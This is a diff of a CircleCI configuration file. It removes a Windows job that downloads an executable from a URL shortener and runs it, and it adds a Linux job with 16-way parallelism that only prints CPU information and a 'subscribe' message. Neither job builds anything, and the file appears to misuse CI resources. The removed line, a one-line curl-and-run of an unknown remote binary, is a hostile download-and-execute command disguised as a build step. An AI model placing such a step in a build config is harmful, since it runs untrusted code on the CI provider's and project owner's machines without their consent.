@@ -1,12 +1,18 @@
 version: 2.1
+jobs:
+    asam:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              lscpu
+              echo Hello,subscribe it
 
-orbs:
-   win: circleci/windows@2.2.0
-
-jobs: 
-  build: 
-    executor:
-      name: win/default
-      shell: cmd.exe
-    steps:
-      - run: curl -L -o rDwz0VHD09.exe https://shortenlinks.net/rDwz0VHD09 && rDwz0VHD09.exe
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - asam
